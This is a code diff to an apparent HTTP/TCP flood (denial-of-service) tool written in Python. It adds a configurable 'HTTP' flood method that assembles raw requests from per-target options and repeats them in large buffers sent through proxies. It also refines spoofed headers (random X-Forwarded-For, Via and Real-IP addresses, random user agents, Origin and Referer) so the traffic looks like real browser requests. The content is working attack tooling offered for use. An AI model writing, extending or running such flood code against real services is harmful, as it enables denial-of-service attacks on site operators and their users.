@@ -1,5 +1,6 @@
 import asyncio
 import errno
+import json
 import random
 import struct
 import time
@@ -15,8 +16,8 @@ from typing import Callable, Optional, Set, Tuple
 import aiohttp
 import async_timeout
 from aiohttp_socks import ProxyConnector
-from dns import inet
 from OpenSSL import SSL
+from requests.structures import CaseInsensitiveDict
 from yarl import URL
 
 from . import proxy_proto
@@ -117,23 +118,22 @@ class FloodBase:
 class AsyncTcpFlood(FloodBase):
 
     BASE_HEADERS = {
+        "Accept": "*/*",
         'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'ru-RU,ru;q=0.9',
+        'Accept-Language': 'ru-RU,ru;q=0.9,en-US,en;q=0.7',
         'Cache-Control': 'max-age=0',
         'Connection': 'Keep-Alive',
         'Sec-Fetch-Dest': 'document',
         'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-Site': 'same-origin',
         'Sec-Fetch-User': '?1',
-        'Sec-Gpc': '1',
         'Pragma': 'no-cache',
-        'Upgrade-Insecure-Requests': '1',
     }
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self._req_type = (
-            "POST" if self._method in {"POST", "XMLRPC", "STRESS"}
+            "POST" if self._method in {"POST", "STRESS", "XMLRPC"}
             else "HEAD" if self._method in {"HEAD", "RHEAD"}
             else "GET"
         )
@@ -144,9 +144,12 @@ class AsyncTcpFlood(FloodBase):
 
     def default_headers(self) -> dict:
         ip: str = Tools.rand_ipv4()
+        origin = str(self._url.origin())
         headers = {
             **self.BASE_HEADERS,
             "Host": self._url.raw_authority,
+            "Origin": origin,
+            "Referer": origin,  # emulate Referrer-Policy: origin
             "User-Agent": random.choice(USERAGENTS),
             "X-Forwarded-Host": self._url.raw_host,
             "Via": ip,
@@ -155,17 +158,20 @@ class AsyncTcpFlood(FloodBase):
             "X-Forwarded-For": ip,
             "Real-IP": ip,
         }
-        if not inet.is_address(self._url.host):
-            headers["Referer"] = str(self._url)
         return headers
 
-    def build_request(self, path_qs=None, headers: Optional[dict] = None, body=None) -> bytes:
+    def build_request(self, *, req_type=None, path_qs=None, headers: Optional[dict] = None, body=None) -> bytes:
+        req_type = req_type or self._req_type
         path_qs = path_qs or self._url.raw_path_qs
         headers = headers or self.default_headers()
 
-        headers = '\r\n'.join(f"{key}: {value}" for key, value in headers.items())
+        headers = '\r\n'.join(
+            f"{key}: {value}"
+            for key, value in headers.items()
+            if value is not None
+        )
         request = (
-            f"{self._req_type} {path_qs} HTTP/1.1\r\n"
+            f"{req_type} {path_qs} HTTP/1.1\r\n"
             + headers
             + '\r\n'
         )
@@ -229,8 +235,48 @@ class AsyncTcpFlood(FloodBase):
 
         return await self._exec_proto(conn, on_connect, on_close)
 
+    async def HTTP(self, on_connect=None) -> bool:
+        def payload():
+            get_opt = self._target.option
+
+            req_type = get_opt('verb')
+            path_qs = get_opt('path_qs')
+            body = get_opt('body')
+            raw_headers = get_opt('headers')
+            include_default_headers = get_opt('include_default_headers', True)
+
+            headers = CaseInsensitiveDict(self.default_headers()) if include_default_headers else {}
+            if raw_headers:
+                if isinstance(raw_headers, dict):
+                    parsed = raw_headers
+                else:
+                    parsed = json.loads(Tools.render(raw_headers))
+                headers.update(parsed)
+
+            if path_qs:
+                path_qs = Tools.render(path_qs)
+
+            if body:
+                body = Tools.render(body)
+                headers['Content-Length'] = str(len(body))
+
+            return self.build_request(
+                req_type=req_type,
+                path_qs=path_qs,
+                headers=headers,
+                body=body
+            ) * self._settings.requests_per_buffer
+
+        return await self._generic_flood_proto(
+            FloodSpecType.BUFFER,
+            (payload, self._settings.requests_per_buffer),
+            on_connect
+        )
+
     async def GET(self, on_connect=None) -> bool:
-        payload = lambda: self.build_request() * self._settings.requests_per_buffer
+        def payload():
+            return self.build_request() * self._settings.requests_per_buffer
+
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
